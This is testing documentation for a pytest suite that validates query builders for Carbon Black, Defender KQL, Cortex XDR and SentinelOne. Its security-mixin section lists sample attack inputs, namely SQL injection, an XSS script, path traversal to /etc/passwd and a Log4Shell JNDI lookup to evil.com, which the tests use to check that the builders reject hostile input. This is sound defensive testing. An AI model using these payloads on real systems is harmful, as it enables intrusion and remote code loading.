# Testing Documentation

## Overview

This document provides comprehensive documentation for the test suite used to validate query builders across multiple security platforms: Carbon Black Cloud (CBC), Microsoft Defender (KQL), Cortex XDR, and SentinelOne (S1).

The test suite is built using **pytest** and follows a modular architecture with reusable test patterns through base classes and mixins. This approach ensures consistent validation across all query builders while allowing platform-specific customization.

## Table of Contents

1. [Test Architecture](#test-architecture)
2. [Running Tests](#running-tests)
3. [Test Files Overview](#test-files-overview)
4. [Base Test Classes](#base-test-classes)
5. [Test Mixins](#test-mixins)
6. [Platform-Specific Tests](#platform-specific-tests)
7. [Writing New Tests](#writing-new-tests)
8. [Test Coverage Goals](#test-coverage-goals)

---

## Test Architecture

### Design Principles

The test suite follows these key principles:

1. **Inheritance-Based Reusability**: Common test patterns are defined in base classes and mixins
2. **Platform-Specific Customization**: Each platform test suite inherits base patterns but can override or extend them
3. **Mock Schema Testing**: Tests use mock schemas to avoid external dependencies
4. **Comprehensive Coverage**: Tests cover functionality, security, edge cases, and error handling

### Directory Structure

```
tests/
├── __init__.py                      # Package initialization
├── base_query_builder_test.py      # Base classes and mixins
├── test_queryforge.py   # KQL (Microsoft Defender) tests
├── test_cbc_query_builder.py       # Carbon Black Cloud tests
├── test_cortex_query_builder.py    # Cortex XDR tests
└── test_s1_query_builder.py        # SentinelOne tests
```

---

## Running Tests

### Prerequisites

```bash
# Install testing dependencies
pip install pytest pytest-cov
```

### Basic Commands

```bash
# Run all tests
pytest tests/

# Run tests with verbose output
pytest tests/ -v

# Run specific test file
pytest tests/test_cbc_query_builder.py

# Run specific test class
pytest tests/test_cbc_query_builder.py::TestCBCQueryBuilder

# Run specific test method
pytest tests/test_cbc_query_builder.py::TestCBCQueryBuilder::test_build_cbc_query_with_nl_intent

# Run tests matching a pattern
pytest tests/ -k "natural_language"

# Run with coverage report
pytest tests/ --cov=queryforge --cov-report=html
```

### Useful Options

- `-v` or `--verbose`: Detailed test output
- `-s`: Show print statements (disable output capture)
- `-x`: Stop after first failure
- `--pdb`: Drop into debugger on failures
- `-m MARKEXPR`: Run tests matching marker expression
- `--tb=short`: Shorter traceback format

### Running Tests by Category

```bash
# Run security validation tests
pytest tests/ -k "injection or security"

# Run IOC extraction tests
pytest tests/ -k "ioc"

# Run limit validation tests
pytest tests/ -k "limit"
```

---

## Test Files Overview

### base_query_builder_test.py

**Purpose**: Defines abstract base classes and mixins that provide reusable test patterns for all query builders.

**Key Components**:
- `BaseQueryBuilderTest`: Core test patterns all builders must implement
- `SecurityValidationMixin`: Security-focused tests (injection prevention)
- `IOCExtractionMixin`: IOC extraction validation
- `LimitValidationMixin`: Query limit boundary testing
- `BooleanOperatorMixin`: Boolean operator validation

**Does Not**: Contain executable tests (all methods are patterns for subclasses)

---

### test_queryforge.py

**Purpose**: Tests the KQL (Kusto Query Language) query builder for Microsoft Defender XDR.

**Platform**: Microsoft Defender Advanced Hunting

**Mock Schema**: Includes `DeviceProcessEvents` and `DeviceNetworkEvents` tables

**Test Coverage**:
- Natural language to KQL translation
- Table selection and inference
- WHERE clause construction
- Time window parsing (`ago()` syntax)
- Column projection (`project` statements)
- Aggregation (`summarize` clauses)
- Sorting (`order by` clauses)
- Limit enforcement
- IOC extraction (IPs, domains, hashes)
- Security validation (SQL injection prevention)

**Key Features**:
- Tests fuzzy table name matching
- Validates KQL-specific operators
- Tests time range formats (e.g., "last 7 days" → "ago(7d)")

---

### test_cbc_query_builder.py

**Purpose**: Tests the Carbon Black Cloud query builder.

**Platform**: VMware Carbon Black Cloud

**Mock Schema**: Includes process and binary search types with CBC-specific fields

**Test Coverage**:
- Natural language intent parsing
- IOC extraction (IPv4, IPv6, MD5, SHA256)
- Structured term-based queries
- Boolean operators (AND/OR)
- Limit clamping (MAX_LIMIT = 5000)
- Security validation (unsafe character detection)
- Field-value pair construction
- Search type inference

**Key Features**:
- Tests CBC query syntax (e.g., `process_name:value`)
- Validates limit clamping at 5000
- Tests IPv6 and port number extraction
- Validates command line and username extraction

**Platform-Specific**:
- CBC uses field:value syntax
- Supports multiple search types (process, binary, alert, threat)
- Has strict character validation

---

### test_cortex_query_builder.py

**Purpose**: Tests the Cortex XDR query builder using XQL (XDR Query Language).

**Platform**: Palo Alto Cortex XDR

**Mock Schema**: Includes `xdr_data` dataset with common XDR fields

**Test Coverage**:
- Natural language to XQL translation
- Dataset selection and inference
- Filter construction (pipe-based)
- Field selection (`fields` stage)
- Process alias resolution (e.g., "powershell" → executable names)
- Time range filters (`interval` syntax)
- Limit enforcement
- IOC extraction and field mapping

**Key Features**:
- Tests XQL pipe-based syntax
- Validates filter operators (=, contains, etc.)
- Tests time range expressions
- Validates default field selection

**Platform-Specific**:
- XQL uses pipe operators (`|`)
- Supports dataset inference from query intent
- Uses `filter` and `fields` stages

---

### test_s1_query_builder.py

**Purpose**: Tests the SentinelOne query builder using S1QL.

**Platform**: SentinelOne EDR

**Mock Schema**: Includes `processes` and `network_actions` datasets with S1 field naming

**Test Coverage**:
- Natural language to S1QL translation
- Dataset inference (processes vs. network)
- Operator normalization (e.g., `In` → `in`)
- Filter construction with S1QL operators
- IOC extraction and field mapping
- Boolean operators (AND/OR)
- Case-insensitive operators (`in:anycase`, `contains:anycase`)

**Key Features**:
- Tests S1 field naming conventions (e.g., `tgt.process.displayName`)
- Validates operator variants (case-sensitive vs. case-insensitive)
- Tests list-based operators (`in` with multiple values)
- Validates event type inference

**Platform-Specific**:
- S1QL uses dot-notation for nested fields
- Supports case-insensitive variants of operators
- Has specific event types (e.g., `PROCESSCREATION`)

---

## Base Test Classes

### BaseQueryBuilderTest

**Purpose**: Defines core test patterns that ALL query builders must pass.

**Abstract Properties** (must be implemented by subclasses):
- `builder_function`: Returns the query builder function to test
- `mock_schema`: Returns the mock schema for testing
- `required_params`: Returns minimum required parameters for a valid query

**Common Test Patterns**:

1. **Empty/Invalid Input Handling**
   - `test_empty_natural_language_intent()`: Tests empty string handling
   - `test_none_natural_language_intent_without_params()`: Tests None without other params
   - `test_whitespace_only_intent()`: Tests whitespace-only strings

2. **Schema Validation**
   - `test_invalid_schema_type()`: Tests non-dict schema
   - `test_empty_schema()`: Tests empty schema dictionary

3. **Return Value Validation**
   - `test_query_returns_tuple()`: Ensures (query, metadata) tuple return
   - `test_metadata_contains_expected_keys()`: Validates metadata structure

**Usage Example**:
```python
class TestMyBuilder(BaseQueryBuilderTest):
    @property
    def builder_function(self):
        return my_query_builder.build_query
    
    @property
    def mock_schema(self):
        return {"fields": {...}}
    
    @property
    def required_params(self):
        return {"table": "events"}
```

---

## Test Mixins

### SecurityValidationMixin

**Purpose**: Tests security aspects including injection prevention.

**Key Methods**:

1. **`get_injection_test_cases()`**: Returns list of malicious input patterns
   - SQL injection attempts
   - Command injection
   - XSS payloads
   - Path traversal
   - JNDI/Log4Shell patterns

2. **`test_injection_prevention_in_natural_language()`**: Tests that malicious inputs are:
   - Rejected with an error, OR
   - Properly escaped/sanitized

**Test Cases Include**:
```python
"; DROP TABLE users"
"' OR '1'='1"
"<script>alert('xss')</script>"
"../../../etc/passwd"
"${jndi:ldap://evil.com/a}"
```

**Override Example**:
```python
def get_injection_test_cases(self):
    base_cases = super().get_injection_test_cases()
    # Add platform-specific cases
    return base_cases + ["platform_specific_injection"]
```

---

### IOCExtractionMixin

**Purpose**: Tests extraction of Indicators of Compromise (IOCs) from natural language.

**Key Methods**:

1. **`get_ioc_test_cases()`**: Returns dictionary of IOC types to test values
   - IPv4 addresses
   - IPv6 addresses
   - MD5 hashes
   - SHA256 hashes
   - Domain names

2. **`test_ioc_extraction_from_natural_language()`**: Tests that IOCs are:
   - Extracted from natural language queries
   - Mapped to appropriate fields
   - Included in the query or metadata

**IOC Types Tested**:
```python
{
    "ipv4": "192.168.1.100",
    "ipv6": "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
    "md5": "5d41402abc4b2a76b9719d911017c592",
    "sha256": "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae",
    "domain": "malicious.example.com"
}
```

---

### LimitValidationMixin

**Purpose**: Tests validation of query result limits.

**Key Methods**:

1. **`get_max_limit()`**: Returns platform's maximum allowed limit (or None)

2. **Test Methods**:
   - `test_negative_limit()`: Ensures negative limits are rejected
   - `test_zero_limit()`: Ensures zero limits are rejected
   - `test_excessive_limit_clamping()`: Tests limit clamping behavior

**Platform Examples**:
- **CBC**: MAX_LIMIT = 5000 (clamped)
- **KQL**: No hard maximum (warnings above 10000)
- **Cortex**: Platform-specific limits
- **S1**: Platform-specific limits

---

### BooleanOperatorMixin

**Purpose**: Tests boolean operator validation (AND, OR, etc.).

**Key Methods**:

1. **`get_valid_operators()`**: Returns list of valid boolean operators

2. **Test Methods**:
   - `test_valid_boolean_operators()`: Tests all valid operators work
   - `test_invalid_boolean_operator()`: Tests invalid operators are rejected

**Notes**:
- Some platforms (like KQL) don't use this parameter directly
- Tests can skip with `pytest.skip()` if not applicable

---

## Platform-Specific Tests

Each platform test suite includes tests beyond the base patterns:

### KQL-Specific Tests

```python
test_build_kql_query_with_simple_natural_language_intent()
test_build_kql_query_with_table_and_where_clause()
test_time_window_parsing_from_natural_language()
test_summarize_and_order_by()
test_table_name_fuzzy_matching()
```

**Focus Areas**:
- KQL pipe operators (`|`)
- `ago()` time syntax
- `project`, `where`, `summarize`, `order by` clauses
- Table fuzzy matching with rapidfuzz

### CBC-Specific Tests

```python
test_build_cbc_query_with_nl_intent()
test_build_cbc_query_with_iocs()
test_limit_clamping_at_max()
test_ipv6_extraction()
test_port_extraction()
```

**Focus Areas**:
- field:value syntax
- Limit clamping at 5000
- Search type inference
- Boolean operator application

### Cortex-Specific Tests

```python
test_build_cortex_query_with_nl_intent()
test_build_cortex_query_with_default_fields()
test_build_cortex_query_with_process_alias()
test_build_cortex_query_with_time_range()
```

**Focus Areas**:
- XQL pipe stages
- Process alias resolution
- Time interval syntax
- Filter operators

### S1-Specific Tests

```python
test_build_s1_query_from_natural_language_process()
test_build_s1_query_with_structured_filters()
test_infer_network_dataset_from_intent()
test_operator_normalization_capitalin_to_lowercase()
```

**Focus Areas**:
- S1 field naming (dot-notation)
- Dataset inference
- Operator normalization
- Case-insensitive operator variants

---

## Writing New Tests

### Adding a Test to Existing Suite

1. **Choose the appropriate test file** based on platform
2. **Follow the naming convention**: `test_<feature>_<scenario>()`
3. **Use descriptive docstrings**:
   ```python
   def test_my_new_feature(self):
       """Tests that my new feature works correctly with edge cases."""
       # Test implementation
   ```
4. **Include assertions** that clearly indicate what's being validated
5. **Handle expected failures** with `pytest.raises()` or `try/except`

### Creating a New Platform Test Suite

1. **Create a new test file**: `tests/test_<platform>_query_builder.py`

2. **Import base classes**:
   ```python
   from tests.base_query_builder_test import (
       BaseQueryBuilderTest,
       SecurityValidationMixin,
       IOCExtractionMixin,
       LimitValidationMixin,
       BooleanOperatorMixin,
   )
   ```

3. **Define mock schema**:
   ```python
   MOCK_SCHEMA = {
       "tables": {...},
       "fields": {...}
   }
   ```

4. **Create test class**:
   ```python
   class TestMyPlatformBuilder(
       BaseQueryBuilderTest,
       SecurityValidationMixin,
       IOCExtractionMixin,
       LimitValidationMixin,
       BooleanOperatorMixin
   ):
       """Test suite for MyPlatform query builder."""
       
       @property
       def builder_function(self):
           return my_platform_builder.build_query
       
       @property
       def mock_schema(self):
           return MOCK_SCHEMA
       
       @property
       def required_params(self):
           return {"table": "events"}
       
       def get_max_limit(self):
           return 1000  # or None
       
       def get_valid_operators(self):
           return ["AND", "OR"]
       
       # Add platform-specific tests
       def test_platform_specific_feature(self):
           """Tests platform-specific functionality."""
           pass
   ```

### Mock Schema Best Practices

1. **Keep schemas minimal** but representative:
   ```python
   MOCK_SCHEMA = {
       "tables": {
           "events": {
               "columns": [
                   {"name": "timestamp", "type": "datetime"},
                   {"name": "process_name", "type": "string"},
                   {"name": "ip_address", "type": "string"}
               ]
           }
       }
   }
   ```

2. **Include fields needed for IOC testing**: IPs, hashes, domains

3. **Match the structure** of the real schema as closely as possible

4. **Document schema structure** with comments if complex

### Test Naming Conventions

- `test_<functionality>`: Basic functionality test
- `test_<functionality>_<scenario>`: Specific scenario test
- `test_error_on_<condition>`: Error handling test
- `test_<ioc_type>_extraction`: IOC extraction test
- `test_invalid_<input>`: Input validation test

---

## Test Coverage Goals

### Functional Coverage

- ✅ Natural language to query translation
- ✅ Structured parameter-based query building
- ✅ Field/column selection and projection
- ✅ Filter/where clause construction
- ✅ Time range parsing and filtering
- ✅ Aggregation and grouping
- ✅ Sorting and ordering
- ✅ Limit application

### Security Coverage

- ✅ SQL injection prevention
- ✅ Command injection prevention
- ✅ XSS payload handling
- ✅ Path traversal prevention
- ✅ Special character sanitization
- ✅ Input validation

### IOC Coverage

- ✅ IPv4 address extraction
- ✅ IPv6 address extraction
- ✅ MD5 hash extraction
- ✅ SHA256 hash extraction
- ✅ Domain name extraction
- ✅ Port number extraction
- ✅ Process name extraction

### Edge Cases

- ✅ Empty/null inputs
- ✅ Whitespace-only inputs
- ✅ Invalid schema types
- ✅ Empty schemas
- ✅ Boundary limit values
- ✅ Invalid operators
- ✅ Missing required parameters
- ✅ Special characters in values

### Error Handling

- ✅ Appropriate exceptions raised
- ✅ Descriptive error messages
- ✅ Graceful degradation where appropriate
- ✅ Input sanitization

---

## Continuous Integration

### Recommended CI Configuration

```yaml
# .github/workflows/test.yml
name: Tests

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: [3.8, 3.9, '3.10', '3.11']
    
    steps:
    - uses: actions/checkout@v2
    - name: Set up Python ${{ matrix.python-version }}
      uses: actions/setup-python@v2
      with:
        python-version: ${{ matrix.python-version }}
    
    - name: Install dependencies
      run: |
        pip install -r requirements.txt
        pip install pytest pytest-cov
    
    - name: Run tests with coverage
      run: |
        pytest tests/ --cov=queryforge --cov-report=xml
    
    - name: Upload coverage to Codecov
      uses: codecov/codecov-action@v2
```

---

## Troubles
